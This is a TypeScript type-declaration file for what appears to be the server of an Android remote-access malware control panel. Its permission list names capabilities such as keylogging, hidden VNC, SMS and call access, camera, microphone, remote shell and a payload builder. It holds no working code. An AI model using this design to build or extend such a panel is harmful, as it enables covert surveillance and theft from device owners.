export type UserRole = 'admin' | 'user';
export type Permission = 'dashboard:view' | 'device:view' | 'device:sms' | 'device:calls' | 'device:contacts' | 'device:gps' | 'device:camera' | 'device:mic' | 'device:files' | 'device:wifi' | 'device:clipboard' | 'device:notifications' | 'device:permissions' | 'device:apps' | 'device:fason' | 'device:screen' | 'device:hvnc' | 'device:keylogger' | 'device:proxy' | 'device:shell' | 'device:command' | 'device:delete' | 'builder:access' | 'logs:view' | 'logs:clear' | 'users:manage' | 'settings:view' | 'settings:edit' | 'stats:view' | 'files:download';
export declare const ALL_PERMISSIONS: Permission[];
export declare const DEFAULT_USER_PERMISSIONS: Permission[];
export declare const PERMISSION_GROUPS: {
    label: string;
    permissions: {
        key: Permission;
        label: string;
        description: string;
    }[];
}[];
/** Admin gets all permissions; user gets their assigned list. Fail-closed: returns empty on error. */
export declare function resolvePermissions(role: UserRole, permissionsJson: string): Permission[];
export { CMD, SCREEN_ACTION, REALTIME_COMMANDS } from '../constants/index.js';
export type { ScreenAction } from '../constants/index.js';
import { CMD } from '../constants/index.js';
export type CmdType = typeof CMD[keyof typeof CMD];
export interface CommandPayload {
    type: CmdType;
    action?: string;
    [key: string]: unknown;
}
export interface ApiResponse<T = unknown> {
    success: boolean;
    data?: T;
    error?: string;
}
export interface JwtPayload {
    userId: number;
    username: string;
    email: string;
    role: UserRole;
    permissions: Permission[];
    sessionId?: string;
}
export interface ServerConfig {
    port: number;
    debug: boolean;
    socket: {
        pingInterval: number;
        pingTimeout: number;
        maxHttpBufferSize: number;
        transports: string[];
        cors: {
            origin: string | boolean;
            methods: string[];
        };
    };
    rateLimit: {
        windowMs: number;
        maxRequests: number;
    };
    build: {
        timeout: number;
    };
    security: {
        sessionTimeout: number;
        loginAttempts: number;
        loginLockout: number;
    };
    logger: {
        maxDbLogs: number;
        files: {
            maxSize: string;
            errorRetention: string;
        };
        console: {
            enabled: boolean;
        };
    };
}
//# sourceMappingURL=index.d.ts.map